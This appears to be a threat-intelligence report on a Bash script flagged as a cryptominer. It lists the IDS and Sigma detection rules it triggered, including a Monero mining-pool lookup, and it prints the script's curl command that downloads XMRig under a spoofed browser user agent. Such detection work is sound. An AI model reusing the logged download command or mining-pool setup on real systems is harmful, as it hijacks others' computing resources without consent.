crowdsourced_ids_results.rule_msg: ET COINMINER CoinMiner Domain in DNS Lookup (pool .hashvault .pro)
crowdsourced_ids_results.rule_raw: alert dns $HOME_NET any -> any any (msg:"ET COINMINER CoinMiner Domain in DNS Lookup (pool .hashvault .pro)"; dns.query; content:"pool.hashvault.pro"; nocase; bsize:18; classtype:coin-mining; sid:2036289; rev:1; metadata:created_at 2022_04_21, performance_impact Significant, confidence High, signature_severity Major, updated_at 2022_04_21;)

threat_severity.level_description: Severity HIGH because it was considered adware. Other contributing factor was that it could not be run in sandboxes.

sigma_analysis_results.rule_title: Monero Crypto Coin Mining Pool Lookup
sigma_analysis_results.rule_description: Detects suspicious DNS queries to Monero mining pools

sigma_analysis_results.rule_title: Network Communication With Crypto Mining Pool
sigma_analysis_results.rule_description: Detects initiated network connections to crypto mining pools
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)

sigma_analysis_results.rule_description: Detects chmod targeting files in abnormal directory paths.

sigma_analysis_results.rule_title: Suspicious Curl Change User Agents - Linux
sigma_analysis_results.rule_description: Detects a suspicious curl process start on linux with set useragent options

match_context.values: @{CommandLine=/usr/bin/curl curl -L -o kal.tar.gz --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz; Image=/usr/bin/curl; EventID=1}

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine
sigma_analysis_results.rule_author: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger

match_context.values: @{CommandLine=curl -L -o kal.tar.gz --user-agent Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz; Image=curl; EventID=1}

sigma_analysis_results.rule_description: Detects enumeration of local systeam accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.
Detects a curl process start on linux, which indicates a file download from a remote location or a simple web request to a remote server

match_context.values: @{CommandLine=/usr/bin/curl curl -L -o kal.tar.gz --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz; Image=/usr/bin/curl; EventID=1}

attributes.magic: Bourne-Again shell script, ASCII text executable
